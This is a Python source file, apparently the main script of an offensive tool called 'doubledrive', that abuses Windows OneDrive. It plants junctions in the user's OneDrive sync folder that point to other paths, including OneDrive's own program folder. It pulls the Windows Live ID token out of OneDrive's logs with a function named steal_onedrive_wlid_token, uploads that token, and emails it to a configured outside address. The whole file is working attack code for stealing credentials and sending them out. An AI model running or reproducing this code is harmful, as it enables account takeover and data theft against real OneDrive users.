import subprocess
import time
import os
import winreg

import options
from odl_parser.odl import get_odl_rows
from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
from reparse_points.reparse_points import create_mount_point
from onedrive_info import get_onedrive_info
from token_extraction import steal_onedrive_wlid_token


def main():
    onedrive_info = get_onedrive_info()

    if options.SHOULD_CREATE_ONEDRIVE_BINARIES_JUNCTION:
        junctions_names_to_target_paths = options.JUNCTION_NAMES_TO_TARGET_PATHS.copy()
        junctions_names_to_target_paths[options.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME] = onedrive_info.version_installation_folder
    else:
       junctions_names_to_target_paths = options.JUNCTION_NAMES_TO_TARGET_PATHS

    print("Creating junctions to targets")
    for junction_name, target_path in junctions_names_to_target_paths.items():
        junction_path = os.path.join(onedrive_info.sync_folder, junction_name)
        create_mount_point(junction_path, target_path)

    print("Extracting Windows Live ID token from OneDrive's logs")
    windows_live_token = steal_onedrive_wlid_token()
    if None == windows_live_token:
        print("Did not find the WLID token")
        return 1
    onedrive_session = OneDrive()
    onedrive_session.login_using_token(windows_live_token)
    print("Uploading token to OneDrive")
    onedrive_token_file_item = onedrive_session.create_file(f"/{options.TOKEN_FILE_NAME}", windows_live_token)
    print("Sending token file to the configured email address using OneDrive API")
    onedrive_session.send_item_to_email(onedrive_token_file_item, options.TOKEN_DST_EMAIL_ADDRESS)
    


if "__main__" == __name__:
    main()